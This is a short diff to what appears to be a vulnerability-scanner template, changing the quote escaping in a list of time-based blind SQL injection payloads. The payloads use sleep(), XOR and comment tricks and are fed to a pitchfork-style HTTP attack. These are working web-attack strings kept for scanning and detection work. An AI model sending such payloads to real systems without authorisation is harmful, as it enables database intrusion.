@@ -44,9 +44,9 @@ http:
           - "if(now()=sysdate(),sleep([SLEEPTIME]),0)"
           - "XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR"
           - "(select(0)from(select(sleep([SLEEPTIME])))v)"
-          - "0'XOR(if(now()=sysdate()%2Csleep([SLEEPTIME])%2C0))XOR'Z"
-          - "0'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z"
-          - "if(now()=sysdate(),sleep([SLEEPTIME]),0)/*'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR'"XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR"*/"
+          - "0\'XOR(if(now()=sysdate()%2Csleep([SLEEPTIME])%2C0))XOR\'Z"
+          - "0\'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR\'Z"
+          - "if(now()=sysdate(),sleep([SLEEPTIME]),0)/*\'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR\'\"XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR\"*/"
           
     attack: pitchfork
     analyzer:
